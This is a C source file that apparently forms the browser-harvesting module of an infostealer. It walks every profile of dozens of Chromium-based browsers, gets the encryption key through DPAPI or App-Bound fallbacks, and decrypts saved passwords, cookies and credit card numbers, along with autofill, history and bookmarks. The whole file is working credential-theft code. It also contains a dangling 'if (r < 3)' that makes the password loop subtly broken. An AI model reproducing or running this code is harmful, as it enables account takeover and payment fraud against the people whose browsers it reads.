/*
 * chromium.c — Chromium browser data extraction
 *
 * Extracts logins, cookies, and history from Chromium-based browsers.
 * Supports 58 browsers (Chrome, Edge, Brave, Opera, Vivaldi, etc.).
 * Uses DPAPI for master key decryption and AES-256-GCM for passwords.
 */

#include "chromium.h"
#include "browser_paths.h"
#include "chrome_crypto.h"
#include "appbound.h"
#include "sqlite.h"
#include "config.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifdef _WIN32
#include <windows.h>
#include <io.h>
#define PATH_SEP "\\"
#define PATH_SEP_CHAR '\\'
#else
#include <sys/stat.h>
#include <dirent.h>
#define PATH_SEP "/"
#define PATH_SEP_CHAR '/'
#endif

/* ── Helper: read entire file into malloc'd buffer ───────────── */

static unsigned char *read_file(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return NULL; }

    unsigned char *buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }

    size_t rd = fread(buf, 1, (size_t)sz, f);
    fclose(f);

    if (rd != (size_t)sz) { free(buf); return NULL; }
    *out_len = rd;
    return buf;
}

/* ── Helper: path join ───────────────────────────────────────── */

static char *path_join(const char *a, const char *b) {
    size_t la = strlen(a);
    size_t lb = strlen(b);
    char *out = (char *)malloc(la + 1 + lb + 1);
    if (!out) return NULL;
    memcpy(out, a, la);
    out[la] = PATH_SEP_CHAR;
    memcpy(out + la + 1, b, lb + 1);
    return out;
}

/* ── Helper: check if directory exists ───────────────────────── */

static int dir_exists(const char *path) {
#ifdef _WIN32
    DWORD attr = GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES &&
            (attr & FILE_ATTRIBUTE_DIRECTORY));
#else
    struct stat st;
    return (stat(path, &st) == 0 && S_ISDIR(st.st_mode));
#endif
}

/* ── Helper: check if file exists ────────────────────────────── */

static int file_exists(const char *path) {
#ifdef _WIN32
    DWORD attr = GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES &&
            !(attr & FILE_ATTRIBUTE_DIRECTORY));
#else
    struct stat st;
    return (stat(path, &st) == 0 && S_ISREG(st.st_mode));
#endif
}

/* ── Helper: extract basename from path ──────────────────────── */

static const char *basename_of(const char *path) {
    const char *last = strrchr(path, PATH_SEP_CHAR);
    return last ? last + 1 : path;
}

/* ── Find profile directories ────────────────────────────────── */

/*
 * Chromium profiles are named: Default, Profile 1, Profile 2, ...
 * Returns malloc'd array of malloc'd path strings.
 */
static char **find_profiles(const char *base_path, size_t *count) {
    size_t cap = 16;
    char **profiles = (char **)calloc(cap, sizeof(char *));
    if (!profiles) return NULL;
    *count = 0;

    /* Check "Default" */
    char *def = path_join(base_path, "Default");
    if (def && dir_exists(def)) {
        profiles[(*count)++] = def;
    } else {
        free(def);
    }

    /* Check "Profile 1", "Profile 2", ... */
    for (int i = 1; i < 100; i++) {
        char name[32];
        snprintf(name, sizeof(name), "Profile %d", i);
        char *p = path_join(base_path, name);
        if (!p) break;

        if (dir_exists(p)) {
            if (*count >= cap) {
                cap *= 2;
                char **tmp = (char **)realloc(profiles, cap * sizeof(char *));
                if (!tmp) { free(p); break; }
                profiles = tmp;
            }
            profiles[(*count)++] = p;
        } else {
            free(p);
            break; /* Profiles are sequential — if Profile N is missing, stop */
        }
    }

    return profiles;
}

/* ── Extract master key from Local State ─────────────────────── */

/*
 * Reads Local State JSON, extracts encrypted_key, decrypts with DPAPI.
 * Falls back to App-Bound decryption if DPAPI fails (Chrome v120+).
 * Returns 32-byte AES key.
 * Returns 0 on success, -1 on failure.
 */
static int get_master_key(const char *base_path, unsigned char *key32) {
    char *ls_path = path_join(base_path, "Local State");
    if (!ls_path) return -1;

    /* Detect browser type from path for App-Bound COM GUIDs */
    AppBoundBrowser browser = APPBOUND_CHROME;
    if (strstr(base_path, "Microsoft\\Edge") || strstr(base_path, "Microsoft/Edge"))
        browser = APPBOUND_EDGE;
    else if (strstr(base_path, "BraveSoftware"))
        browser = APPBOUND_BRAVE;
    else if (strstr(base_path, "AVAST Software"))
        browser = APPBOUND_AVAST;

    /* ── Strategy 1: Standard DPAPI on encrypted_key ──────────── */

    size_t json_len = 0;
    unsigned char *json = read_file(ls_path, &json_len);
    if (!json) { dbg_printf("[!] get_master_key: Local State read failed\n"); free(ls_path); return -1; }

    unsigned char enc_key[4096];
    size_t enc_len = 0;
    int rc = chrome_extract_encrypted_key((const char *)json, json_len,
                                          enc_key, sizeof(enc_key), &enc_len);
    free(json);
    if (rc < 0) { dbg_printf("[!] get_master_key: encrypted_key extraction failed\n"); free(ls_path); return -1; }
    

    unsigned char dpapi_key[256];
    size_t dpapi_len = 0;
    rc = chrome_decrypt_dpapi_key(enc_key, enc_len,
                                  dpapi_key, sizeof(dpapi_key), &dpapi_len);
    if (rc == 0) {
        size_t copy = dpapi_len < 32 ? dpapi_len : 32;
        memcpy(key32, dpapi_key, copy);
        if (copy < 32) memset(key32 + copy, 0, 32 - copy);
        
        free(ls_path);
        return 0;
    }
    dbg_printf("[!] get_master_key: DPAPI failed (error 13 = App-Bound?)\n");

    /* ── Strategy 2: App-Bound decryption via appbound module ─── */

    
    if (appbound_get_key(ls_path, browser, key32) == 0) {
        
        free(ls_path);
        return 0;
    }

    /* ── Strategy 3: App-Bound on encrypted_key blob directly ─── */

    
    if (appbound_decrypt(enc_key, enc_len, browser, key32) == 0) {
        
        free(ls_path);
        return 0;
    }

    dbg_printf("[!] get_master_key: all strategies failed\n");
    free(ls_path);
    return -1;
}

/* ── Extract logins from a single profile ────────────────────── */

/*
 * Reads Login Data SQLite DB, decrypts passwords with AES-256-GCM.
 * Returns malloc'd array of "url\tuser\tpassword\n" strings.
 */
char **extract_chromium_logins(const char *profile_path,
                               const unsigned char *key,
                               size_t *count) {
    *count = 0;

    char *db_path = path_join(profile_path, "Login Data");
    if (!db_path) return NULL;

    size_t db_len = 0;
    unsigned char *db_data = read_file(db_path, &db_len);
    free(db_path);
    if (!db_data) { dbg_printf("[!] Login Data: read_file failed\n"); return NULL; }
    

    SqliteDb db;
    if (sqlite_open(&db, db_data, db_len) != 0) {
        dbg_printf("[!] Login Data: sqlite_open failed\n");
        free(db_data);
        return NULL;
    }

    SqliteRow *rows = NULL;
    size_t row_count = 0;
    if (sqlite_read_table(&db, "logins", &rows, &row_count) != 0) {
        dbg_printf("[!] Login Data: sqlite_read_table(\"logins\") failed\n");
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }
    

    /* Find column indices by reading column names */
    SqliteColumns cols;
    if (sqlite_get_columns(&db, "logins", &cols) != 0) {
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    int idx_origin = -1, idx_user = -1, idx_pass = -1;
    for (size_t i = 0; i < cols.count; i++) {
        if (strcmp(cols.names[i], "origin_url") == 0) idx_origin = (int)i;
        if (strcmp(cols.names[i], "username_value") == 0) idx_user = (int)i;
        if (strcmp(cols.names[i], "password_value") == 0) idx_pass = (int)i;
    }
    sqlite_free_columns(&cols);

    if (idx_origin < 0 || idx_user < 0 || idx_pass < 0) {
        dbg_printf("[!] Login Data: columns not found (origin=%d user=%d pass=%d)\n", idx_origin, idx_user, idx_pass);
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }
    

    /* Allocate result array */
    size_t cap = 64;
    char **result = (char **)calloc(cap, sizeof(char *));
    if (!result) {
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }
    *count = 0;

    unsigned char dec_buf[8192];
    int decrypt_ok = 0, decrypt_fail = 0, not_blob = 0, short_row = 0;

    for (size_t r = 0; r < row_count; r++) {
        SqliteRow *row = &rows[r];
        if (row->count <= (size_t)(idx_pass > idx_origin ? idx_pass : idx_user)) {
            short_row++;
            continue;
        }

        const char *origin = "";
        size_t origin_len = 0;
        const char *username = "";
        size_t user_len = 0;

        if (row->values[idx_origin].type == SQLITE_VAL_TEXT) {
            origin = (const char *)row->values[idx_origin].as.text.ptr;
            origin_len = row->values[idx_origin].as.text.len;
        }
        if (row->values[idx_user].type == SQLITE_VAL_TEXT) {
            username = (const char *)row->values[idx_user].as.text.ptr;
            user_len = row->values[idx_user].as.text.len;
        }

        /* Decrypt password blob */
        if (row->values[idx_pass].type != SQLITE_VAL_BLOB) {
            not_blob++;
            continue;
        }
        const unsigned char *enc = row->values[idx_pass].as.blob.ptr;
        size_t enc_len = row->values[idx_pass].as.blob.len;

        size_t dec_len = 0;
        if (chrome_decrypt_password(enc, enc_len, key,
                                    dec_buf, sizeof(dec_buf), &dec_len) != 0) {
            decrypt_fail++;
            if (r < 3) 
            continue;
        }
        decrypt_ok++;

        /* Format: "origin\tusername\tpassword\n" */
        size_t line_len = origin_len + 1 + user_len + 1 + dec_len + 1;
        char *line = (char *)malloc(line_len);
        if (!line) continue;

        memcpy(line, origin, origin_len);
        line[origin_len] = '\t';
        memcpy(line + origin_len + 1, username, user_len);
        line[origin_len + 1 + user_len] = '\t';
        memcpy(line + origin_len + 1 + user_len + 1, dec_buf, dec_len);
        line[line_len - 1] = '\n';

        /* Grow array if needed */
        if (*count >= cap) {
            cap *= 2;
            char **tmp = (char **)realloc(result, cap * sizeof(char *));
            if (!tmp) { free(line); continue; }
            result = tmp;
        }

        result[(*count)++] = line;
    }

    sqlite_free_rows(rows, row_count);
    sqlite_close(&db);
    free(db_data);

    if (*count == 0) {
        free(result);
        return NULL;
    }
    return result;
}

/* ── Extract cookies from a single profile ───────────────────── */

/*
 * Reads Cookies SQLite DB (in Network subdirectory), decrypts encrypted_value.
 * Returns tab-separated cookie lines in Netscape format.
 */
char **extract_chromium_cookies(const char *profile_path,
                                const unsigned char *key,
                                size_t *count) {
    *count = 0;

    /* Chrome stores cookies in Profile/Network/Cookies */
    char *db_path = path_join(profile_path, "Network");
    if (!db_path) return NULL;
    char *full_path = path_join(db_path, "Cookies");
    free(db_path);
    if (!full_path) return NULL;

    size_t db_len = 0;
    unsigned char *db_data = read_file(full_path, &db_len);
    free(full_path);
    if (!db_data) return NULL;

    SqliteDb db;
    if (sqlite_open(&db, db_data, db_len) != 0) {
        free(db_data);
        return NULL;
    }

    SqliteRow *rows = NULL;
    size_t row_count = 0;
    if (sqlite_read_table(&db, "cookies", &rows, &row_count) != 0) {
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    SqliteColumns cols;
    if (sqlite_get_columns(&db, "cookies", &cols) != 0) {
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    int idx_host = -1, idx_name = -1, idx_path = -1;
    int idx_enc_val = -1, idx_expires = -1, idx_value = -1;
    for (size_t i = 0; i < cols.count; i++) {
        if (strcmp(cols.names[i], "host_key") == 0) idx_host = (int)i;
        if (strcmp(cols.names[i], "name") == 0) idx_name = (int)i;
        if (strcmp(cols.names[i], "path") == 0) idx_path = (int)i;
        if (strcmp(cols.names[i], "encrypted_value") == 0) idx_enc_val = (int)i;
        if (strcmp(cols.names[i], "expires_utc") == 0) idx_expires = (int)i;
        if (strcmp(cols.names[i], "value") == 0) idx_value = (int)i;
    }
    sqlite_free_columns(&cols);

    if (idx_host < 0 || idx_name < 0 || idx_path < 0) {
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    size_t cap = 64;
    char **result = (char **)calloc(cap, sizeof(char *));
    if (!result) {
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }
    *count = 0;

    unsigned char dec_buf[8192];

    for (size_t r = 0; r < row_count; r++) {
        SqliteRow *row = &rows[r];
        if (row->count <= (size_t)idx_path) continue;

        const char *host = "", *name = "", *path = "/";
        size_t host_len = 0, name_len = 0, path_len = 1;
        int64_t expires = 0;

        if (idx_host >= 0 && row->values[idx_host].type == SQLITE_VAL_TEXT) {
            host = (const char *)row->values[idx_host].as.text.ptr;
            host_len = row->values[idx_host].as.text.len;
        }
        if (idx_name >= 0 && row->values[idx_name].type == SQLITE_VAL_TEXT) {
            name = (const char *)row->values[idx_name].as.text.ptr;
            name_len = row->values[idx_name].as.text.len;
        }
        if (idx_path >= 0 && row->values[idx_path].type == SQLITE_VAL_TEXT) {
            path = (const char *)row->values[idx_path].as.text.ptr;
            path_len = row->values[idx_path].as.text.len;
        }
        if (idx_expires >= 0 && row->values[idx_expires].type == SQLITE_VAL_INTEGER)
            expires = row->values[idx_expires].as.integer;

        /* Try to decrypt encrypted_value, fall back to plain value */
        const char *cookie_val = "";
        size_t val_len = 0;
        int decrypted = 0;

        if (idx_enc_val >= 0 && row->values[idx_enc_val].type == SQLITE_VAL_BLOB) {
            const unsigned char *enc = row->values[idx_enc_val].as.blob.ptr;
            size_t enc_len = row->values[idx_enc_val].as.blob.len;
            size_t dec_len = 0;
            if (chrome_decrypt_password(enc, enc_len, key,
                                        dec_buf, sizeof(dec_buf), &dec_len) == 0) {
                cookie_val = (const char *)dec_buf;
                val_len = dec_len;
                decrypted = 1;
            }
        }
        if (!decrypted && idx_value >= 0 &&
            row->values[idx_value].type == SQLITE_VAL_TEXT) {
            cookie_val = (const char *)row->values[idx_value].as.text.ptr;
            val_len = row->values[idx_value].as.text.len;
        }

        /* Format: "host\tTRUE\tpath\tFALSE\texpires\tname\tvalue\n" */
        char expires_str[32];
        snprintf(expires_str, sizeof(expires_str), "%lld", (long long)expires);

        size_t line_len = host_len + 5 + path_len + 6 +
                          strlen(expires_str) + 1 + name_len + 1 + val_len + 2;
        char *line = (char *)malloc(line_len);
        if (!line) continue;

        int written = snprintf(line, line_len, "%s\tTRUE\t%s\tFALSE\t%s\t%s\t%s\n",
                               host, path, expires_str, name, cookie_val);
        if (written < 0 || (size_t)written >= line_len) {
            free(line);
            continue;
        }

        if (*count >= cap) {
            cap *= 2;
            char **tmp = (char **)realloc(result, cap * sizeof(char *));
            if (!tmp) { free(line); continue; }
            result = tmp;
        }

        result[(*count)++] = line;
    }

    sqlite_free_rows(rows, row_count);
    sqlite_close(&db);
    free(db_data);

    if (*count == 0) {
        free(result);
        return NULL;
    }
    return result;
}

/* ── Extract history from a single profile ───────────────────── */

/*
 * Reads History SQLite DB, extracts url, title, visit_count.
 * Returns tab-separated lines.
 */
char **extract_chromium_history(const char *profile_path, size_t *count) {
    *count = 0;

    char *db_path = path_join(profile_path, "History");
    if (!db_path) return NULL;

    size_t db_len = 0;
    unsigned char *db_data = read_file(db_path, &db_len);
    free(db_path);
    if (!db_data) return NULL;

    SqliteDb db;
    if (sqlite_open(&db, db_data, db_len) != 0) {
        free(db_data);
        return NULL;
    }

    SqliteRow *rows = NULL;
    size_t row_count = 0;
    if (sqlite_read_table(&db, "urls", &rows, &row_count) != 0) {
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    SqliteColumns cols;
    if (sqlite_get_columns(&db, "urls", &cols) != 0) {
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    int idx_url = -1, idx_title = -1, idx_count = -1;
    for (size_t i = 0; i < cols.count; i++) {
        if (strcmp(cols.names[i], "url") == 0) idx_url = (int)i;
        if (strcmp(cols.names[i], "title") == 0) idx_title = (int)i;
        if (strcmp(cols.names[i], "visit_count") == 0) idx_count = (int)i;
    }
    sqlite_free_columns(&cols);

    if (idx_url < 0 || idx_title < 0 || idx_count < 0) {
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    size_t cap = 64;
    char **result = (char **)calloc(cap, sizeof(char *));
    if (!result) {
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }
    *count = 0;

    for (size_t r = 0; r < row_count; r++) {
        SqliteRow *row = &rows[r];
        if (row->count <= (size_t)idx_count) continue;

        const char *url = "", *title = "";
        size_t url_len = 0, title_len = 0;
        int64_t visits = 0;

        if (row->values[idx_url].type == SQLITE_VAL_TEXT) {
            url = (const char *)row->values[idx_url].as.text.ptr;
            url_len = row->values[idx_url].as.text.len;
        }
        if (row->values[idx_title].type == SQLITE_VAL_TEXT) {
            title = (const char *)row->values[idx_title].as.text.ptr;
            title_len = row->values[idx_title].as.text.len;
        }
        if (row->values[idx_count].type == SQLITE_VAL_INTEGER)
            visits = row->values[idx_count].as.integer;

        char visits_str[32];
        snprintf(visits_str, sizeof(visits_str), "%lld", (long long)visits);

        size_t line_len = title_len + 1 + url_len + 1 + strlen(visits_str) + 2;
        char *line = (char *)malloc(line_len);
        if (!line) continue;

        int written = snprintf(line, line_len, "%s\t%s\t%s\n", title, url, visits_str);
        if (written < 0 || (size_t)written >= line_len) {
            free(line);
            continue;
        }

        if (*count >= cap) {
            cap *= 2;
            char **tmp = (char **)realloc(result, cap * sizeof(char *));
            if (!tmp) { free(line); continue; }
            result = tmp;
        }

        result[(*count)++] = line;
    }

    sqlite_free_rows(rows, row_count);
    sqlite_close(&db);
    free(db_data);

    if (*count == 0) {
        free(result);
        return NULL;
    }
    return result;
}

/* ── Collect from all Chromium browsers ──────────────────────── */

CollectResult collect_chromium(const char *local_app_data, const char *roaming_app_data) {
    CollectResult result = {0};

    size_t browser_count;
    const BrowserPath *browsers = get_chromium_browsers(&browser_count);

    /* Allocate initial capacity */
    size_t cap = 16;
    result.data = (BrowserData *)calloc(cap, sizeof(BrowserData));
    if (!result.data) return result;
    result.count = 0;

    for (size_t b = 0; b < browser_count; b++) {
        const char *app_data = browsers[b].use_roaming ? roaming_app_data : local_app_data;
        char *base_path = path_join(app_data, browsers[b].path_suffix);
        if (!base_path) continue;

        if (!dir_exists(base_path)) {
            free(base_path);
            continue;
        }

        /* Get the master key for this browser */
        unsigned char key32[32];
        int key_ok = (get_master_key(base_path, key32) == 0);
        /* Fallback: derive key from empty password (no DPAPI, works on Linux/dev) */
        if (!key_ok)
            chrome_derive_key(key32);

        /* Find profile directories */
        size_t profile_count = 0;
        char **profiles = find_profiles(base_path, &profile_count);

        for (size_t p = 0; p < profile_count; p++) {
            /* Grow result array if needed */
            if (result.count >= cap) {
                cap *= 2;
                BrowserData *tmp = (BrowserData *)realloc(result.data,
                                                          cap * sizeof(BrowserData));
                if (!tmp) continue;
                result.data = tmp;
            }

            BrowserData *bd = &result.data[result.count];
            memset(bd, 0, sizeof(*bd));

            bd->browser_name = strdup(browsers[b].name);
            bd->profile_name = strdup(basename_of(profiles[p]));

            /* Extract each data type — failures are non-fatal */
            bd->logins = extract_chromium_logins(profiles[p], key32, &bd->login_count);
            bd->cookies = extract_chromium_cookies(profiles[p], key32, &bd->cookie_count);
            bd->history = extract_chromium_history(profiles[p], &bd->history_count);
            bd->cards = extract_chromium_cards(profiles[p], key32, &bd->card_count);
            bd->autofill = extract_chromium_autofill(profiles[p], &bd->autofill_count);
            bd->bookmarks = extract_chromium_bookmarks(profiles[p], &bd->bookmark_count);

            result.count++;
        }

        /* Free profile paths */
        for (size_t p = 0; p < profile_count; p++)
            free(profiles[p]);
        free(profiles);
        free(base_path);
    }

    return result;
}

/* ── Extract credit cards ────────────────────────────────────── */

char **extract_chromium_cards(const char *profile_path,
                              const unsigned char *key,
                              size_t *count) {
    *count = 0;

    char *db_path = path_join(profile_path, "Web Data");
    if (!db_path) return NULL;

    FILE *f = fopen(db_path, "rb");
    free(db_path);
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return NULL; }

    unsigned char *buf = malloc(sz);
    if (!buf) { fclose(f); return NULL; }
    size_t rd = fread(buf, 1, sz, f);
    fclose(f);
    if (rd != (size_t)sz) { free(buf); return NULL; }

    SqliteDb db;
    if (sqlite_open(&db, buf, sz) != 0) { free(buf); return NULL; }

    SqliteRow *rows = NULL;
    size_t row_count = 0;
    if (sqlite_read_table(&db, "credit_cards", &rows, &row_count) != 0) {
        sqlite_close(&db);
        free(buf);
        return NULL;
    }

    char **result = calloc(row_count > 0 ? row_count : 1, sizeof(char *));
    size_t out = 0;

    for (size_t i = 0; i < row_count; i++) {
        if (rows[i].count < 4) continue;
        /* columns: name_on_card, card_number_encrypted, expiration_month, expiration_year */
        const char *name = rows[i].values[0].type == SQLITE_VAL_TEXT ? (const char *)rows[i].values[0].as.text.ptr : "";
        const char *month = rows[i].values[2].type == SQLITE_VAL_TEXT ? (const char *)rows[i].values[2].as.text.ptr : "";
        const char *year = rows[i].values[3].type == SQLITE_VAL_TEXT ? (const char *)rows[i].values[3].as.text.ptr : "";

        // Decrypt card number
        char card_num[256] = {0};
        if (rows[i].values[1].type == SQLITE_VAL_BLOB && key) {
            const unsigned char *enc = rows[i].values[1].as.blob.ptr;
            size_t enc_len = rows[i].values[1].as.blob.len;
            size_t dec_len = 0;
            unsigned char dec[256];
            if (chrome_decrypt_password(enc, enc_len, key, dec, sizeof(dec), &dec_len) == 0) {
                size_t copy = dec_len < sizeof(card_num) - 1 ? dec_len : sizeof(card_num) - 1;
                memcpy(card_num, dec, copy);
                card_num[copy] = '\0';
            }
        }

        char line[512];
        int written = snprintf(line, sizeof(line), "%s\t%s\t%s\t%s\n", name, card_num, month, year);
        if (written < 0 || (size_t)written >= sizeof(line)) continue;
        result[out] = strdup(line);
        out++;
    }

    sqlite_free_rows(rows, row_count);
    sqlite_close(&db);
    free(buf);

    *count = out;
    return result;
}

/* ── Extract autofill ────────────────────────────────────────── */

char **extract_chromium_autofill(const char *profile_path, size_t *count) {
    *count = 0;

    char *db_path = path_join(profile_path, "Web Data");
    if (!db_path) return NULL;

    FILE *f = fopen(db_path, "rb");
    free(db_path);
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return NULL; }

    unsigned char *buf = malloc(sz);
    if (!buf) { fclose(f); return NULL; }
    size_t rd = fread(buf, 1, sz, f);
    fclose(f);
    if (rd != (size_t)sz) { free(buf); return NULL; }

    SqliteDb db;
    if (sqlite_open(&db, buf, sz) != 0) { free(buf); return NULL; }

    SqliteRow *rows = NULL;
    size_t row_count = 0;
    if (sqlite_read_table(&db, "autofill", &rows, &row_count) != 0) {
        sqlite_close(&db);
        free(buf);
        return NULL;
    }

    char **result = calloc(row_count > 0 ? row_count : 1, sizeof(char *));
    size_t out = 0;

    for (size_t i = 0; i < row_count; i++) {
        if (rows[i].count < 2) continue;
        const char *name = rows[i].values[0].type == SQLITE_VAL_TEXT ? (const char *)rows[i].values[0].as.text.ptr : "";
        const char *value = rows[i].values[1].type == SQLITE_VAL_TEXT ? (const char *)rows[i].values[1].as.text.ptr : "";

        char line[512];
        int written = snprintf(line, sizeof(line), "%s\t%s\n", name, value);
        if (written < 0 || (size_t)written >= sizeof(line)) continue;
        result[out] = strdup(line);
        out++;
    }

    sqlite_free_rows(rows, row_count);
    sqlite_close(&db);
    free(buf);

    *count = out;
    return result;
}

/* ── Extract bookmarks ───────────────────────────────────────── */

static void walk_bookmarks_json(const char *json, size_t len,
                                char ***list, size_t *count, size_t *cap) {
    /* Simple JSON parser: look for "name" and "url" fields */
    const char *p = json;
    const char *end = json + len;

    while (p < end) {
        /* Find "type":"url" pattern */
        const char *type_marker = strstr(p, "\"type\":\"url\"");
        if (!type_marker) break;

        /* Find "name" before type */
        const char *name_start = NULL;
        const char *scan = type_marker;
        while (scan > json) {
            scan--;
            if (strncmp(scan, "\"name\":\"", 8) == 0) {
                name_start = scan + 8;
                break;
            }
        }

        /* Find "url" after type */
        const char *url_start = NULL;
        scan = type_marker + 12;
        while (scan < end - 5) {
            if (strncmp(scan, "\"url\":\"", 7) == 0) {
                url_start = scan + 7;
                break;
            }
            scan++;
        }

        if (name_start && url_start) {
            /* Extract name */
            const char *name_end = strchr(name_start, '"');
            if (!name_end) { p = type_marker + 12; continue; }
            size_t name_len = name_end - name_start;

            /* Extract url */
            const char *url_end = strchr(url_start, '"');
            if (!url_end) { p = type_marker + 12; continue; }
            size_t url_len = url_end - url_start;

            char line[1024];
            int written = snprintf(line, sizeof(line), "%.*s\t%.*s\n",
                     (int)name_len, name_start,
                     (int)url_len, url_start);
            if (written < 0 || (size_t)written >= sizeof(line)) {
                p = type_marker + 12;
                continue;
            }

            if (*count >= *cap) {
                *cap = (*cap) ? (*cap) * 2 : 32;
                char **tmp = (char **)realloc(*list, (*cap) * sizeof(char *));
                if (!tmp) return;
                *list = tmp;
            }
            (*list)[*count] = strdup(line);
            (*count)++;
        }

        p = type_marker + 12;
    }
}

char **extract_chromium_bookmarks(const char *profile_path, size_t *count) {
    *count = 0;

    char *file_path = path_join(profile_path, "Bookmarks");
    if (!file_path) return NULL;

    FILE *f = fopen(file_path, "rb");
    free(file_path);
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return NULL; }

    unsigned char *buf = malloc(sz);
    if (!buf) { fclose(f); return NULL; }
    size_t rd = fread(buf, 1, sz, f);
    fclose(f);
    if (rd != (size_t)sz) { free(buf); return NULL; }

    char **list = NULL;
    size_t list_count = 0;
    size_t list_cap = 0;

    walk_bookmarks_json((const char *)buf, sz, &list, &list_count, &list_cap);

    free(buf);

    *count = list_count;
    return list;
}

/* ── Free collected data ─────────────────────────────────────── */

void free_browser_data(CollectResult *result) {
    for (size_t i = 0; i < result->count; i++) {
        free(result->data[i].browser_name);
        free(result->data[i].profile_name);

        for (size_t j = 0; j < result->data[i].login_count; j++)
            free(result->data[i].logins[j]);
        free(result->data[i].logins);

        for (size_t j = 0; j < result->data[i].cookie_count; j++)
            free(result->data[i].cookies[j]);
        free(result->data[i].cookies);

        for (size_t j = 0; j < result->data[i].card_count; j++)
            free(result->data[i].cards[j]);
        free(result->data[i].cards);

        for (size_t j = 0; j < result->data[i].history_count; j++)
            free(result->data[i].history[j]);
        free(result->data[i].history);

        for (size_t j = 0; j < result->data[i].autofill_count; j++)
            free(result->data[i].autofill[j]);
        free(result->data[i].autofill);

        for (size_t j = 0; j < result->data[i].bookmark_count; j++)
            free(result->data[i].bookmarks[j]);
        free(result->data[i].bookmarks);
    }
    free(result->data);
    result->data = NULL;
    result->count = 0;
}
